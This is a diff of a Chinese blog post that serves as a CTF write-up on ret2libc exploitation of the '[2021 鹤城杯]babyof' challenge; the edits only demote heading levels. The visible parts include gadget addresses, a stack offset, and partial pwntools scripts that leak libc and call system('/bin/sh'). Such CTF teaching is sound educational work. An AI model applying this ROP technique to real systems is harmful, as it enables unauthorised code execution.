@@ -9,15 +9,15 @@ tags: [pwn]
 recommend: 10
 ---
 
-# PWN-Ret2libc
+## PWN-Ret2libc
 
-## 基本概念
+### 基本概念
 
 > libc 是 Linux 系统中遵循 ANSI C 标准的 C 语言函数库，提供文件操作、内存管理、字符串处理等基础功能，并封装系统调用以便应用程序使用。
 
 ---
 
-## Ret2libc 与 ROP 链的终点
+### Ret2libc 与 ROP 链的终点
 
 现代二进制程序普遍开启了 NX（不可执行）保护，导致传统的“栈溢出直接执行 Shellcode”失效。此时，Glibc 中丰富的代码片段成为了现成的利用跳板。
 
@@ -27,7 +27,7 @@ recommend: 10
 
 ---
 
-## PLT表和GOT表
+### PLT表和GOT表
 
 在进行ret2libc学习之前，我们需要先了解一下PLT表与GOT表的内容。
 
@@ -81,7 +81,7 @@ puts@plt 在 0x400520:  jmp  *[puts@got]    ; 跳转到 GOT 记录的位置
 
 ---
 
-## 解题思路
+### 解题思路
 
 我们的目标是拿到shell ，换言之就是，劫持二进制可执行文件的执行流程，让程序执行system("/bin/sh")。拆分这个目标，可以分为以下两个步骤：
 
@@ -127,13 +127,13 @@ puts@plt 在 0x400520:  jmp  *[puts@got]    ; 跳转到 GOT 记录的位置
 
 ----
 
-## 知识点动画
+### 知识点动画
 
 [HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/ret2libc/pwn_ret2libc.html · 工程部Teddy Bear/网络安全 - 码云 - 开源中国](https://gitee.com/ASUS_HACKED/cybersecurity/blob/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/ret2libc/pwn_ret2libc.html)
 
 ---
 
-# [2021 鹤城杯]babyof
+## [2021 鹤城杯]babyof
 
 题目链接:
 https://www.nssctf.cn/problem/469
@@ -153,7 +153,7 @@ checksec --file=babyof
 
 ---
 
-## pwntools 基础速查
+### pwntools 基础速查
 
 | 代码                   | 作用                              |
 | ---------------------- | --------------------------------- |
@@ -169,7 +169,7 @@ checksec --file=babyof
 | `r.interactive()`      | 进入交互模式，可以敲命令          |
 | `ROPgadget --binary X` | 搜索 gadget（命令行工具）         |
 
-## 0x01 检查保护
+### 0x01 检查保护
 
 ```bash
 checksec --file=babyof
@@ -200,7 +200,7 @@ Libc的解题就是先找一个函数基地址，计算libc基址，再进行sys
 
 ---
 
-## 0x02 offset计算
+### 0x02 offset计算
 
 函数栈布局：
 
@@ -242,13 +242,13 @@ offset = 72
 
 ---
 
-## 0x03 攻击思路
+### 0x03 攻击思路
 
 程序只有 3 个 PLT 函数：`puts`、`read`、`setvbuf`。
 
 没有 `system`，没有 `/bin/sh`，所以分两步：
 
-### 第 1 步：泄露 libc 地址
+#### 第 1 步：泄露 libc 地址
 
 ```lua
 puts(puts@got)  → 打印出 puts 在 libc 中的真实地址
@@ -256,7 +256,7 @@ puts(puts@got)  → 打印出 puts 在 libc 中的真实地址
                 → 算出 system 和 /bin/sh
 ```
 
-### 第 2 步：ROP 调用 system
+#### 第 2 步：ROP 调用 system
 
 ```bash
 system("/bin/sh")  → 拿 shell
@@ -264,9 +264,9 @@ system("/bin/sh")  → 拿 shell
 
 ---
 
-## 0x04 需要的地址
+### 0x04 需要的地址
 
-### 程序内地址（无 PIE，地址固定）
+#### 程序内地址（无 PIE，地址固定）
 
 | 什么           | 地址       | 怎么找                                        |
 | -------------- | ---------- | --------------------------------------------- |
@@ -276,7 +276,7 @@ system("/bin/sh")  → 拿 shell
 | `pop rdi; ret` | `0x400743` | `ROPgadget --binary babyof \| grep "pop rdi"` |
 | `ret`          | `0x40066a` | `ROPgadget --binary babyof \| grep ": ret$"`  |
 
-### ibc 内地址（需要泄露后计算）
+#### ibc 内地址（需要泄露后计算）
 
 | 什么      | 怎么算                              |
 | --------- | ----------------------------------- |
@@ -292,9 +292,9 @@ pop_rdi_addr = 0x0400743
 
 ---
 
-## 0x05 ROP 链图解
+### 0x05 ROP 链图解
 
-### 第 1 轮：泄露
+#### 第 1 轮：泄露
 
 ```python
 payload = "a"*72 + pop_rdi + puts_got + puts_plt + vuln_addr
@@ -329,7 +329,7 @@ ldd babyof
 
 ![image-20260514132340537](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152947659-2072343628.png)
 
-### payload 1泄漏构造
+#### payload 1泄漏构造
 
 ```python
 from pwn import *
@@ -340,7 +340,7 @@ r = process('./babyof')
 elf = ELF('./babyof')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
-#part1
+##part1
 r.recvline()
 offset = 72
 pop_rdi = 0x0400743
@@ -367,7 +367,7 @@ r.interactive()
 
 那么可以还原libc基址了
 
-### payload 2泄露构造
+#### payload 2泄露构造
 
 ```python
 from pwn import *
@@ -378,7 +378,7 @@ r = process('./babyof')
 elf = ELF('./babyof')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
-#part1
+##part1
 r.recvline()
 offset = 72
 pop_rdi = 0x0400743
@@ -394,7 +394,7 @@ leak = r.recvline().strip()
 leak = u64(leak.ljust(8,b'\x00'))
 print("puts addr ->",hex(leak))
 
-#part2
+##part2
 libc.address = leak - libc.symbols['puts']
 
 system = libc.symbols['system']
@@ -456,16 +456,16 @@ system = libc.symbols['system']
 
 ---
 
-## 0x06 常见问题 FAQ
+### 0x06 常见问题 FAQ
 
-### Q1：PLT 和 GOT 有什么区别？
+#### Q1：PLT 和 GOT 有什么区别？
 
 |      | PLT            | GOT                        |
 | ---- | -------------- | -------------------------- |
 | 本质 | 跳板/入口      | 记录真实地址               |
 | 比喻 | 门牌号（固定） | 里面住着谁（运行时才确定） |
 
-### Q2：为什么要返回到 vuln_addr 再打一轮？
+#### Q2：为什么要返回到 vuln_addr 再打一轮？
 
 一次溢出只能做一个 ROP 链。需要：
 
@@ -478,7 +478,7 @@ system = libc.symbols['system']
 
 
 
-### Q3：远程怎么确定 libc 版本？
+#### Q3：远程怎么确定 libc 版本？
 
 1. 先用 exp 打远程，泄露 puts 的地址
 2. 看地址最后 3 位（如 `0xaa0`）
@@ -491,7 +491,7 @@ system = libc.symbols['system']
 
 
 
-### Q4：ret 对齐是做什么的？
+#### Q4：ret 对齐是做什么的？
 
 x86-64 的 system 函数内部有 `movaps` 指令，要求栈 16 字节对齐。不加 `ret` 多弹 8 字节 → 栈不对齐 → 段错误。
 
